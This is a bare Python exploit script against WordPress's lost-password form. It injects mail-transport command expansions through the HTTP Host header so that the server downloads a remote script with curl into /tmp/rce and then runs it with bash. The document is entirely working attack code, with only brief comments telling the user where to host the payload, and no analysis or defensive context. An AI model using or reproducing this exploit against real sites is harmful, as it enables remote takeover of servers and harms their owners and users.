#!/usr/bin/env python3
import requests
import sys

# wordpress's url
target = 'http://127.0.0.1' if len(sys.argv) < 1 else sys.argv[1]
# Put your command in a website, and use the website's url
# don't contains "http://", must be all lowercase
shell_url = 'example.com/1.txt' if len(sys.argv) < 2 else sys.argv[2]
# an exists user
user = 'admin'

def generate_command(command):
    command = '${run{%s}}' % command
    command = command.replace('/', '${substr{0}{1}{$spool_directory}}')
    command = command.replace(' ', '${substr{10}{1}{$tod_log}}')
    return 'target(any -froot@localhost -be %s null)' % command


session = requests.session()
data = {
    'user_login': user,
    'redirect_to': '',
    'wp-submit': 'Get New Password'
}
session.headers = {
    'Host': generate_command('/usr/bin/curl -o/tmp/rce ' + shell_url),
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}
session.allow_redirects = False
target += '/wp-login.php?action=lostpassword'
session.post(target, data=data)

session.headers['Host'] = generate_command('/bin/bash /tmp/rce')
session.post(target, data=data)